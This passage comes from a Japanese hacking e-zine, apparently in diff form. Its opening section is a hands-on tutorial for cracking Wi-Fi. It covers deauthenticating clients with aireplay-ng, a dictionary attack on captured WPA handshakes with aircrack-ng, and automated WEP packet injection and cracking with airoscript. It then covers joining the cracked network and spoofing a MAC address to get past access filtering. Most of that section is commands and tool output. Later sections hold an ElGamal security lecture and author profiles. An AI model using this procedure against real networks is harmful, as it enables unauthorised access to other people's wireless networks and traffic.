+onを実行します。
+
+-----
+# aireplay-ng -0 1 -a 00:11:22:33:44:55 -c XX:XX:XX:XX:XX:XX ath1
+13:25:40 Sending DeAuth to station   -- STMAC: [XX:XX:XX:XX:XX:XX]
+-----
+
+　すると、airodump-ngの右上らへんに「WPA handshake: FF:FF:FF:FF:FF:FF」と
+いうのが出てきますので、それを確認したらairodump-ngを[ctrl]+[c]で終了させ
+ます。
+
+　そうしたらもうあとは解読あるのみです。
+　WPAの場合は辞書アタックしかできませんので「aircrack-ng -w <辞書ファイル
+名> <キャプチャファイル名>」と実行します。この際使用する辞書ファイルに、
+8～63文字の半角英数字の組み合わせ全部が書いてあるもの（サイズがとんでもな
+い大きさになること請け合いですが）を指定することで必ず解読するコトができ
+るハズです。コレ正論よね。
+
+-----
+# aircrack-ng -w /tmp/dic /tmp/wpa-01.cap
+以下略
+-----
+
+　以上でキーが手に入るハズです。ご苦労様でした。
+
+
+■0x05.) ソビエトロシアではVMWareがあなたを使用する！！
+
+　上の解説を長々としてから書くのはものすごーくアレなんですけども、実はた
+った数回の入力であとは自動的に、しかもWindows上で動作する対話式のすんげえ
+簡単な方法あったりします。ならそれをハナから紹介しろよヴォケが！と思わな
+くなくなくないかもしれませんが、この方法はEeePC単体ではできず、チップセッ
+トが「rtl8187」「rt2570」「rt73」であるUSB無線LANアダプタが必要なので今回
+の趣旨とは違うってコトで勘弁してください（笑
+　んでその方法ってのは、皆さまお馴染みの仮想マシンソフト「VMWare」でにai
+rcrack-ngがすでインストールされているOSをマウントして解読な感じです。
+
+　それでは環境整備をしましょう。
+　Windowsをザクザクとインストール（説明略）し、皆さまお馴染みの仮想マシン
+ソフト「VMWare」をインストールします。お金のある人はWorkstationでも構いま
+せんが、べつにPlayerで十分です。そして（ftp://vmware.aircrack-ng.org/）か
+らvmware-aircrack-ng-v4.7zをダウンロードして展開すればオッケーです。この
+ときUSB無線LANアダプタは手に持っておいてください。重要です（大分嘘）
+
+　整備が終わりましたらさっそく解読を始めます。ターゲットAPのBSSIDとESSID
+は上記と同じく「00:11:22:33:44:55」と「niceboat」です。
+　VMwareでaircrack.vmxを開き、文字列のズラズラを堪能して起動が完了したら、
+USB無線LANアダプタをおもむろに挿入します。するとツールバーになんか出てき
+ますので、クリックして認識させます。
+　次に、[左下の無線っぽいアイコン]→[自分の使っているチップセット]→[Sta
+rt_○○]を実行してからairosciptを起動します。このときに使用するインターフ
+ェイスを聞かれるので、適当なヤツのキーを入力してください。
+
+-----
+#######################################
+###     Select your interface       ###
+
+1) rausb0
+#1
+-----
+
+-----
+#######################################
+### What do you want to do?         ###
+### 1) Scan    - Scan for target    ###
+### 2) Select  - Select target      ###
+### 3) Attack  - Attack target      ###
+### 4) Crack   - Get target key     ###
+### 5) Config  - Connect to target  ###
+### 6) Fakeauth- Auth with target   ###
+### 7) Deauth  - Deauth from target ###
+### 8) Reset   - Reset interface    ###
+### 9) Monitor - Airmon-ng device   ###
+###10) Quit    - Quits airoscript   ###
+###11) Test    - Test injection     ###
+###12) ChangeMac- Change your MAC   ###
+#######################################
+### Airodump closed, select a target###
+#?
+-----
+
+　上のようにAirosciptのウィンドウが表示されたら、まずは[1]と入力（以下、
+[1]や[2]）してフィルタやチャンネルを選び、周囲のAPを探します。
+
+-----
+#######################################
+###     Select AP specification     ###
+###                                 ###
+###   1) No filter                  ###
+###   2) OPN                        ###
+###   3) WEP                        ###
+###   4) WPA                        ###
+###   5) WPA1                       ###
+###   6) WPA2                       ###
+###                                 ###
+#######################################
+1
+
+#######################################
+###  Select channel to use          ###
+###                                 ###
+###   1) Channel Hopping            ###
+###   2) Specific channel(s)        ###
+###                                 ###
+#######################################
+1
+-----
+
+-----
+ CH  ? ][ Elapsed: 29 s ][ 2007-05-25 13:10
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+ 
+ 00:11:22:33:44:55   66      253       57    0   1  54  WEP  WEP         niceboat
+ 66:77:88:99:00:11   26      122       12    0   9  54  WEP  WEP         nakanidaremoimasenyo
+
+ BSSID              STATION            PWR  Lost  Packets  Probes
+
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF   65     0       53  niceboat
+ (not associated)   GG:HH:II:JJ:KK:LL   21     0       12
+-----
+
+　ターゲットAPである00:11:22:33:44:55を無事発見することができました。こち
+らもツール側ではどれがお目当てのAPなのかわからないので永遠に頑張り続けま
+すから、気が済んだら[ctrl]+[c]で終了させます。
+
+　続いて、[2]でターゲットAPを選択します。リストには[1]でスキャンされたAP
+のみ表示されるようです。
+
+-----
+#######################################
+### Select Target from this list    ###
+
+ #      MAC                      CHAN    SECU    POWER   #CHAR   SSID
+
+ 1)     00:11:22:33:44:55        1       WEP     97      12      niceboat
+ 2)     66:77:88:99:00:11        9       WEP     42      15      nakanidaremoimasenyo
+
+###     Select target              ###
+#1
+
+#######################################
+### Do you want to select a client? ###
+###                                 ###
+###   1) Yes, only associated       ###
+###   2) No i dont want to          ###
+###   3) Try to detect some         ###
+###   4) Yes show me the clients    ###
+###   5) Correct the SSID first     ###
+###                                 ###
+#######################################
+1
+-----
+
+　そして、[3]で状況に合ったパケットインジェクションを開始させましょう。ア
+タック方法は大体「1)  Fake auth => Automatic」を選んでおけばオッケーです。
+まあイロイロ試してみるのもいいかもしれません。
+　ウィンドウが3つくらい出てきてアタックが開始され、#Dataの値が増加してい
+るのを確認できたら成功です。
+
+-----
+#######################################
+### Attacks not using a client      ###
+### 1)  Fake auth => Automatic      ###
+### 2)  Fake auth => Interactive    ###
+### 3)  Fragmentation attack        ###
+### 4)  Chopchop attack             ###
+#######################################
+### Attacks using a client          ###
+### 5)  ARP replay => Automatic     ###
+### 6)  ARP replay => Interactive   ###
+### 7)  Fragmentation attack        ###
+### 8)  Chopchop attack             ###
+#######################################
+### Injection if xor file generated ###
+### 9)  Chopchop injection          ###
+### 10) Chopchop injection client   ###
+### 11) Fragment injection          ###
+### 12) Fragment injection client   ###
+### 13) ARP inject from xor (PSK)   ###
+#1
+-----
+
+　最後に、[4]で好きな解読方法を指定してスタートさせれば、あとは放置プレイ
+のオールオッケーです。
+
+-----
+#######################################
+###      WEP CRACKING OPTIONS       ###
+###                                 ###
+###   1) aircrack-ng PTW attack     ###
+###   2) aircrack-ng standard       ###
+###   3) aircrack-ng user options   ###
+###   4) wesside-ng attack          ###
+###                                 ###
+#######################################
+1
+-----
+
+-----
+Opening /wifi/00:11:22:33:44:55-01.cap
+以下略
+-----
+
+　以上でキーが手に入るハズです。お疲れ様……は必要ないですね（笑
+
+
+■0x06.) 無線で接続する
+
+　キーを手に入れたからには、一度は接続するのが華ってもんです。
+
+　しかし、eeeXubuntuで無線接続しようとすると、僕の環境だけなのかもわかり
+ませんが、なんだか繋げないことが多いのです。なので、Windows XPで接続する
+ことにします（ヘタレでごめんなさい）。
+　まあ普通に繋げるのは説明不要でしょうから省略しますが、ANY接続拒否されて
+いるために利用可能なネットワーク一覧に出てこないAPの接続方法がわからない
+人が案外いると思います。
+　こういった接続は、ネットワーク接続のワイヤレスネットワーク接続から[プロ
+パティ]→[ワイヤレスネットワーク]→[追加]のネットワーク名にESSIDを、ネッ
+トワークキーにはWEPキーあるいはWPAキーを入力すればオッケーです。なお、Wi
+ndows XPではASCII文字列でしかキーを入力できませんので、aircrack-ptwで解読
+した場合には（http://xls.grrr.jp/js/hex.html）等々で変換してから入力して
+ください。
+　また、接続したいAPがMACアドレスによるアクセス制限をしている場合には、M
+ACアドレスをairodump-ngで確認したものに変更する必要があります。ネットワー
+ク接続のワイヤレスネットワーク接続から[プロパティ]→[構成]→[詳細設定]→
+[Network Address]からでオッケーです。
+
+
+■0x07.) おわりに
+
+　いやー、無線LANは怖いなあ。すっとこどっこいなWEPでゆっくりしてたら腐っ
+てしまいます。無線LAN使ってる人は、さっさとWPAに移行したほうが身のためで
+す。
+
+　では、機会があったらまた会いましょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第4章: 基礎暗号学講座・第16回 ～拡張ElGamal暗号～  ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回のWBでは公開鍵暗号の安全性について言及した。今回は公開鍵暗号の一種
+である拡張ElGamal暗号の仕様とその安全性を紹介する。拡張ElGamal暗号はWB33
+で紹介したElGamal暗号を改良したものである。
+
+　ElGamal暗号はCDH仮定の下で、OW-CPA安全である。一方、拡張ElGamal暗号はD
+DH仮定の下で、IND-CPA安全です。安全性は高くなっていることがわかる。一方、
+仮定は強くなってしまっているように見えるが、厳密には用いている群が違うこ
+とに注意して欲しい。詳細は今回の記事で触れている。
+
+
+■0x02.) 拡張ElGamal暗号の仕様
+
+　公開鍵暗号は鍵生成アルゴリズム・暗号化アルゴリズム・復号アルゴリズムの
+3つのアルゴリズムで構成される。よって、拡張ElGamal暗号も3つのアルゴリズム
+で構成されている。
+
+●鍵生成アルゴリズム
+
+　セキュリティパラメータを入力とする。
+
+1：q|p-1を満たす大きな素数p,qを生成する。
+
+2：位数がqとなる、Z_p^*の元αを生成する。
+
+3：0≦x＜qとなるxをランダムに選択し、y=α^x mod pを計算する。
+
+4：公開鍵pk=(p,q,α,y)、秘密鍵sk=xを出力する。
+
+●暗号化アルゴリズム
+
+　αで構成される巡回群の元を平文mとし、mとpkを入力とする。
+
+1：0≦r＜qとなるrをランダムに選択する。
+
+2：c1=α^r mod p、c2=my^r mod pを計算する。
+
+3：ステップ2で計算したc1,c2を組として、暗号文cとする。そのc=(c1,c2)を出力
+する。
+
+●復号アルゴリズム
+
+　暗号文c=(c1,c2)、skを入力とする。
+
+1：c2/(c1^x) mod pを計算して出力する。
+
+
+■0x03.) アルゴリズムの補足
+
+　以上の3つのアルゴリズムがElGamal暗号の仕様になる。いくつか補足したい部
+分がある。
+
+　ElGamal暗号で用いた群はZ_p^*であった。うまいZ_p^*の部分群を使うことで、
+Z_p^*のときのDL問題・CDH問題・DDH問題よりも解くのが困難になるのである。H
+がGの部分群であるとは、HがGの部分集合であり、なおかつHがGと演算が同じであ
+ると定義される。
+　部分群を用いた方が問題が困難になるという事実を利用したのが拡張ElGamal暗
+号である。そのため、拡張ElGamal暗号の鍵生成アルゴリズムの中に、Z_p^*の部
+分群を使うための準備が含まれているのである。
+
+　鍵生成アルゴリズムのステップ1における「q|p-1」とは、qがp-1を割り切ると
+いう意味である。例えば、p=2q+1の関係などがそうである。このような関係であ
+る素数p,qは次のように生成することができる。
+
+1：大きな素数qを生成する。
+
+2：乱数rを選び、p=2rq+1とする。
+
+3：pが素数かどうかを確認し、素数でないならステップ1に戻る。もしpが素数で
+あれば、(p,q)はq|p-1を満たしている。
+
+　また、鍵生成アルゴリズムのステップ2において、位数という言葉が登場してい
+る。すでに位数は定義済みだが、ここでも復習しておく。kが位数とは、g^k mod
+ p = 1を満たすような最小の値のことである。ステップ2で主張する位数がqとな
+るZ_p^*の元αが存在するのを保証するのは、ステップ1によってq|p-1が成り立つ
+からである。これは次のように証明することができる。
+
+　背理法を用いる。位数q（＝ord_p(a)）がp-1を割り切らないと仮定する。する
+と、p-1=k×q+r、0＜r＜qと書ける。
+　また次のような計算ができる。
+
+1
+≡a^(p-1) mod p　（∵フェルマーの小定理）
+≡a^(k×q+r)
+≡a^(k×q)・a^r
+≡a^r（∵定義よりa^q≡1 mod p）
+
+　よって、a^r≡1 mod pが成り立つ。
+　しかし、r＜qであるが、qの最小性（位数の定義）に反する。ゆえに、位数q（
+＝ord_p(a)）はp-1を割り切る。　□
+
+　そして、このαの生成方法は、Z_p^*の原始元gを求めて、α=g^(2r) mod pを計
+算すればよい。このαの位数はqになっている。即ち、α^q≡1 mod pが成り立つ。
+しかも、このαの位数はqのみである。この事実は次のように証明できる。
+
+　p-1=2rqかつα=g^(2r) mod pより、
+
+α^q
+=(g^(2r))^q
+=g^(2rq)
+=g^(p-1)　（∵p-1=2rq）
+=1 mod p　（∵フェルマーの小定理）
+
+　また、α^i≡1 mod pとなるi（1≦i＜q）が存在すると仮定すると、
+
+（左辺）
+=α^i
+≡(g^(2r))^i
+=g^(2ri)
+
+と計算できるので、g^(2ri)≡1 mod pが成り立つ。
+
+　ここでgの位数は2ri＜2rq=p-1より小さい。これはgが原始元であることに反す
+る。
+
+　よって、α^i≡1 mod qとなるi（1≦i＜q）は存在しない。ゆえに、αの位数は
+qのみである。　□
+
+　α^q≡1 mod pが成り立つため、任意の整数iに対してα^iはα^(i mod q) mod
+ pと考えればよい。つまり、αの指数部はmod qの世界で考えればよいのである。
+よって、このαの巡回群はq個であり、この巡回群の要素は1 mod p,α mod p,α^2
+ mod p,…,α^(q-1) mod pになる。この巡回群を＜α＞と定義する。
+
+
+■0x04.) 完全性
+
+　アルゴリズムが定義されたならば、まず完全性を確認する必要がある。（公開
+鍵暗号の）完全性とは復号アルゴリズムを実行すると、平文に戻ることである。
+つまり、c2/(c1^x) mod pを式展開して、mになれば完全性が成り立つ。
+
+c2/(c1^x) mod p
+=(my^r)/(α^(rx))
+=(mα^(xr))/(α^(rx))
+=m　□
+
+　よって、完全性が示された。
+
+
+■0x05.) 安全性
+
+　「＜α＞に対するDDH問題が困難であれば、拡張ElGamal暗号はIND-CPA安全であ
+る」ことを証明したい。
+
+　これを証明するために対偶で考える。つまり、IND－CPA安全を解くアルゴリズ
+ムAが存在するならば、＜α＞に対するDDH問題を解くアルゴリズムBが存在するこ
+とを示すことができればよい。ここでAの成功確率を(1/2)+εとする。
+
+　証明方法はいつもお馴染みの帰着法である。Aの力を利用して、Bを構成するこ
+とができ、そのBの成功確率がε以上であればよいのである。
+
+　まずBの構成を示す。
+　Bに(α,β,γ,δ)=(α,α^x,α^y,α^z)が与えられるとする。Bの目的はうまく
+細工をすることにより、Aの力を利用して、z=xy mod qかどうかを有意な確率で判
+定することである。
+　Bは(α,β,γ,δ)を入力とし、pk=(p,q,α,β)をAに公開鍵として与える。この
+とき、このpkが拡張ElGamal暗号の公開鍵と同じ分布の必要があるが、p,q,α,β
+すべて同一なため敵はBの中で動作していることに気が付かないので、問題ない。
+　次に、AはCPA攻撃者なので2つの平文m0,m1を外に送る。AはBの内部でm0,m1を送
+信する。Bはそれらを受け取ったら、1ビットのbをランダムに選択する。そして、
+Bはc=(γ,m_bγ)を暗号文としてAに送信する。ここでBが細工しているのである。
+このcも拡張ElGamal暗号の仕様通りに作られた(c1,c2)とまったく同一の分布を示
+すため、AはBの中にいることに気付かないため、問題ない。つまり、Aはcが細工
+されているのに気付かないのである。
+　Aは最後にbの推測として~bをローカル出力する。
+　Bは~bを見て、b=~bが成り立っていれば1（ここではz=xyが成り立っていること
+を意味する）を出力し、b≠~bが成り立っていれば0（ここではz≠xyが成り立って
+いることを意味する）をローカル出力する。
+　以上でBの構成は完了である。
+
+　次に、Bの成功確率を調べる必要がある。
+
+[1]z=xyの場合
+
+　pkとcは拡張ElGamal暗号の仕様通りのpk,cと分布がまったく同一である。
+　よって、仮定よりAは(1/2)+ε以上の確率で、b=~bとなる~bを出力するはずであ
+る。
+　ゆえに、z=xyの場合にBは(1/2)+ε以上の確率で1を出力する。つまり、Bは(1/
+2)+ε以上の確率でz=xyであることを判定できる。
+
+[2]z≠xyの場合
+
+　pkは拡張ElGamal暗号の仕様通りのpkと分布がまったく同一である。また、c=(
+γ,m_bγ)=(γ,m_bα^z)である。zが一様ランダムに取られているので、α^zはZ
+_p^*上で一様分布しており、m_bα^zもZ_p^*上で一様分布である。よって、この
+cは完全にbの情報を隠している。
+　よって、Aは1/2の確率でしか、b=~bとなる~bを出力するしかない。
+　ゆえに、z≠xyの場合にBは1/2の確率で1を出力する。
+
+　したがって、Bの成功確率は次のように計算できる。
+
+Adv(B)
+=Pr[B outputs 1|z=xy]-Pr[B outputs 1|z≠xy]
+≧((1/2)+ε)-(1/2)
+=ε
+
+　つまり、Bの成功確率はε以上であることがわかった。つまり、Aの存在を仮定
+して、Bの存在を示すことができる。
+　しかし、＜α＞に対するDDH問題が困難であることを仮定すれば、Bの存在と矛
+盾する。よって、拡張ElGamal暗号をIND-CPA攻撃に成功する敵は存在しない。つ
+まり、＜α＞に対するDDH問題が困難であるならば、拡張ElGamal暗号はIND-CPA安
+全であることが言える。　□
+
+
+■0x06.) 最後に
+
+　今回の基礎暗号学講座・第16回でようやく3つの公開鍵暗号の仕様とその安全性
+を示すことができた。まだまだ公開鍵暗号は存在するので、今後も具体的な公開
+鍵暗号をもう少し追いかけてみたい。
+　次回は公開鍵暗号の一種であるRabin暗号に準備に必要な数学的概念を解説する
+予定である。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+ --- 第5章: お知らせ ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○Wizard Bible（http://wizardbible.org/）では随時、執筆ライターを募集して
+います。
+　扱う内容のテーマは広義での「under ground」です。例えばハッキングやセキ
+ュリティからピッキングなどと幅広い内容を考えています。また特殊な職業や趣
+味の解説などでも構いません。
+　一回きりでも構いません。また必ず毎回連載する義務もありませんので、でき
+る範囲で構いません。気軽に声をかけてください。
+
+○Kenji AikoさんがQ&Aを作ってくれました。初めて参加する人でもわかりやすく
+書かれていますので、参考にしてください。
+
+http://wizardbible.org/wbQandA.html
+
+○Wizard Bibleに参加希望の方は気軽にメール（ipusiron@gmail.com）ください。
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第6章: 著者プロフィール ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■金床
+●Job: プログラマー
+●Web: http://guardian.jumperz.net/, http://www.jumperz.net/
+●Mail: anvil@jumperz.net
+●Comment:
+　今回はテクニカルネタじゃないです(;´Д`)すみません
+●今欲しいもの
+　車と酒と女と金ですね。あとドラッグ。ロケンロール！なわけはなくて、まぁ
+普通に時間が欲しいでつね。最近は時間が全然ないので好きな映画もまったく見
+てません。この間も（漏れはJUMPERZ.NETなので）「ジャンパーって映画あったけ
+ど、見たんでしょ？」と突っ込まれましたが、まだ見てません。ここ数ヶ月で見
+たのはバイオハザード3だけです。まぁまぁ面白かったです。わら。まぁしかし子
+供が生まれてしまったら時間がないのは当たり前なので仕方ないですね。自己責
+任です。みなさんも射精する際は注意してくだちいｗ
+　あ、映画見る時間はないですが、gantz23巻はばっちり買いました！
+
+
+■はせがわようすけ
+●Job: engineer
+●Web: http://utf-8.jp/
+●Mail: hasegawa@utf-8.jp
+●Comment:
+  このあいだ Kenji Aiko さんにお会いしたときに、「たまにはWBに原稿書けよ
+ｺﾞﾙｧ」と脅されたので書いてみました。決してWB39で催促されたからでも、はて
+ブで催促されたからでも、献本もらったお礼でも何でもないです。
+●今欲しいもの
+　いろいろもっとアウトプットを出していきたいんですけど、なかなか手と頭が
+追いつかないので、加速装置とか欲しいですね。奥歯キラリン☆なやつ。
+
+
+■エクセル小林
+●Job:Student
+●Web:http://xls.grrr.jp/gwvg7qz0f1ckx0rd37p2e7xuoej56v.html
+●Mail:wlfen.p@gmail.com
+●Team（Group):N/A
+●Comment:
+　勢いだけでEeePC買っちゃったためか、使う機会がねええええ。外での使用はも
+ちろん、僕は寝っ転がって何かをするってコトはないので家でもあまり出番なし
+……。どうしたもんか。
+●今欲しいもの:
+　GABBA系のCD。
+　まだ聞き始めて日が浅いため、気に入った曲が全然ありません。誰かオススメ
+の曲教えてください…。
+
+
+■IPUSIRON
+●Job:見習い戦士
+●Web:http://akademeia.info/
+●Mail:ipusiron@gmail.com
+●Comment:
+　現在研修2ヶ月目です。後1ヶ月は研修が続きます。その後プロジェクト配属で
+す。どのプロジェクトに配属されるのかはまだわかりませんが、個人的にはC言語
+かアセンブリ言語を使うところに入りたいです。Javaのプロジェクトが一番多そ
+うですが。
+●今欲しいもの:
+　デジタルペンのMVPenや『C実践プログラミング』（4k以上する）などが今すぐ
+欲しいものですが、今日Amazonで注文してしまいました。
+　現実的ではありませんがとても欲しいものとしては、広い部屋ですね。現在の
+部屋は本やアカデメイア用の道具（外の人にとってはガラクタに見える）に囲ま
+れています。布団を敷くためには、机の椅子を部屋の片隅に移動しなければなら
+ないというような状況です。広い部屋があればアカデメイアの更新も効率が向上
+するのですが…。
